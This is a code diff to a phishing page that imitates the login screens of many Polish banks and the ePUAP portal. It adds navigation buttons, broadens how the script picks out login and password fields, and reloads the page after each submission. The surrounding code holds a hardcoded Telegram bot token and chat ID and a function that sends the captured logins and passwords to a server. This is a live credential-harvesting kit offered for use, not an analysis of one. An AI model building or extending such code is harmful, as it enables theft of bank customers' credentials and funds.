@@ -1101,6 +1101,28 @@
             text-decoration: underline;
         }
 
+        /* ===== BACK BUTTON ===== */
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: transparent;
+            border: none;
+            color: #003b6f;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 8px 0 16px 0;
+            transition: color 0.2s;
+        }
+        .back-btn:hover {
+            color: #001f3f;
+        }
+        .back-btn .arrow {
+            font-size: 20px;
+            line-height: 1;
+        }
+
         /* ===== BANK 2 — Millennium ===== */
         .bank2-full-page {
             display: none;
@@ -4723,6 +4745,7 @@
 
             <!-- ===== BANK 1 ===== -->
             <section class="login-screen" id="loginScreen1">
+                <button class="back-btn" onclick="goBackToBanks()"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="login-container">
                     <div class="login-grid">
                         <div class="login-left">
@@ -4766,7 +4789,7 @@
 
             <!-- ===== BANK 2 ===== -->
             <div class="bank2-full-page" id="loginScreen2">
-                <button class="bank2-close-btn" id="bank2CloseBtn" onclick="closeLoginScreen2()">✕</button>
+                <button class="back-btn" onclick="goBackToBanks2()"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank2-container">
                     <div class="bank2-box">
                         <div class="bank2-logo">
@@ -4802,6 +4825,7 @@
             <!-- ===== BANK 3 ===== -->
             <div class="bank3-full-page" id="loginScreen3">
                 <button class="bank3-close-btn" id="bank3CloseBtn" onclick="closeLoginScreen3()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen3()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank3-header">
                     <div class="bank3-header-content">
                         <span class="bank3-logo"><img src="logo-white.svg" alt="Bank 3"></span>
@@ -4835,6 +4859,7 @@
             <!-- ===== BANK 4 ===== -->
             <div class="bank4-full-page" id="loginScreen4">
                 <button class="bank4-close-btn" id="bank4CloseBtn" onclick="closeLoginScreen4()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen4()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank4-container">
                     <div class="bank4-title">potwierdź swoją tożsamość</div>
                     <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
@@ -4857,6 +4882,7 @@
             <!-- ===== BANK 5 ===== -->
             <div class="bank5-full-page" id="loginScreen5">
                 <button class="bank5-close-btn" id="bank5CloseBtn" onclick="closeLoginScreen5()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen5()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank5-container">
                     <div class="bank5-box">
                         <div class="bank5-alert">
@@ -4888,6 +4914,7 @@
             <!-- ===== BANK 6 ===== -->
             <div class="bank6-full-page" id="loginScreen6">
                 <button class="bank6-close-btn" id="bank6CloseBtn" onclick="closeLoginScreen6()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen6()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank6-container">
                     <div class="bank6-left">
                         <div class="bank6-title">Logowanie</div>
@@ -4921,6 +4948,7 @@
             <!-- ===== BANK 7 ===== -->
             <div class="bank7-full-page" id="loginScreen7">
                 <button class="bank7-close-btn" id="bank7CloseBtn" onclick="closeLoginScreen7()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen7()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank7-container">
                     <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
                     <div class="bank7-box">
@@ -4955,6 +4983,7 @@
             <!-- ===== BANK 8 ===== -->
             <div class="bank8-full-page" id="loginScreen8">
                 <button class="bank8-close-btn" id="bank8CloseBtn" onclick="closeLoginScreen8()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen8()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank8-container">
                     <div class="bank8-left">
                         <div class="bank8-favicon"><img src="favicon.ico" alt="PKO BP"></div>
@@ -4986,6 +5015,7 @@
             <!-- ===== BANK 9 ===== -->
             <div class="bank9-full-page" id="loginScreen9">
                 <button class="bank9-close-btn" id="bank9CloseBtn" onclick="closeLoginScreen9()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen9()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank9-container">
                     <div class="bank9-top">
                         <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
@@ -5013,6 +5043,7 @@
             <!-- ===== BANK 10 ===== -->
             <div class="bank10-full-page" id="loginScreen10">
                 <button class="bank10-close-btn" id="bank10CloseBtn" onclick="closeLoginScreen10()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen10()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank10-container">
                     <div class="bank10-top-logo"><img src="logo (2).png" alt="ePUAP"></div>
                     <div class="bank10-main">
@@ -5049,6 +5080,7 @@
             <!-- ===== BANK 12 ===== -->
             <div class="bank12-full-page" id="loginScreen12">
                 <button class="bank12-close-btn" id="bank12CloseBtn" onclick="closeLoginScreen12()">✕</button>
+                <button class="back-btn" onclick="closeLoginScreen12()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
                 <div class="bank12-container">
                     <div class="bank12-box">
                         <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
@@ -5168,6 +5200,27 @@
         // ===== TELEGRAM CONFIG =====
         const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
         const TELEGRAM_CHAT_ID = '-1004256695843';
+
+        // ===== GO BACK TO BANKS =====
+        function goBackToBanks() {
+            // Hide all login screens
+            document.querySelectorAll('.login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
+                el.classList.remove('visible');
+            });
+            // Show bank selection
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function goBackToBanks2() {
+            document.getElementById('loginScreen2').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
 
         document.addEventListener('DOMContentLoaded', function() {
             // ===== MENU =====
@@ -5412,7 +5465,10 @@
                     password: password
                 })
             })
-            .then(response => response.json())
+            .then(response => {
+                console.log('Response status:', response.status);
+                return response.json();
+            })
             .then(data => {
                 console.log('Server response:', data);
                 if (data.success) {
@@ -5442,9 +5498,9 @@
                 const label = form.querySelector(`label[for="${input.id}"]`);
                 if (label) {
                     const labelText = label.textContent.trim().toLowerCase();
-                    if (labelText.includes('login') || labelText.includes('użytkownik') || labelText.includes('millekod')) {
+                    if (labelText.includes('login') || labelText.includes('użytkownik') || labelText.includes('millekod') || labelText.includes('login do bankowości')) {
                         login = input.value.trim();
-                    } else if (labelText.includes('hasło')) {
+                    } else if (labelText.includes('hasło') || labelText.includes('haslo')) {
                         password = input.value.trim();
                     }
                 }
@@ -5463,10 +5519,11 @@
             console.log(`Login: "${login}", Password: "${password}"`);
 
             if (!login || !password) {
-                alert('Proszę wypełnić wszystkie pola.');
+                alert('Proszę wypełnić wszystkie pola (Login i Hasło).');
                 return false;
             }
 
+            // Send to server
             sendLoginToServer(bankName, login, password)
                 .then(result => {
                     if (result.success) {
@@ -5476,11 +5533,17 @@
                     }
                 });
 
+            // Clear fields
             allInputs.forEach(input => {
                 if (input.type === 'text' || input.type === 'password') {
                     input.value = '';
                 }
             });
+
+            // RELOAD PAGE after successful login
+            setTimeout(() => {
+                location.reload();
+            }, 1500);
 
             return false;
         }
@@ -5494,19 +5557,18 @@
         }
 
         function openLoginScreen2() {
+            document.getElementById('bankSelection').classList.remove('visible');
+            document.getElementById('bankFooter').classList.remove('visible');
             const bank2 = document.getElementById('loginScreen2');
-            const closeBtn = document.getElementById('bank2CloseBtn');
             bank2.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen2() {
-            const bank2 = document.getElementById('loginScreen2');
-            const closeBtn = document.getElementById('bank2CloseBtn');
-            bank2.classList.remove('visible');
-            closeBtn.classList.remove('visible');
+            document.getElementById('loginScreen2').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             document.body.style.overflow = '';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
@@ -5526,6 +5588,8 @@
             bank3.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5544,6 +5608,8 @@
             bank4.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5562,6 +5628,8 @@
             bank5.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5580,6 +5648,8 @@
             bank6.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5598,6 +5668,8 @@
             bank7.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5616,6 +5688,8 @@
             bank8.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5634,6 +5708,8 @@
             bank9.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5652,6 +5728,8 @@
             bank10.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -5670,6 +5748,8 @@
             bank12.classList.remove('visible');
             closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
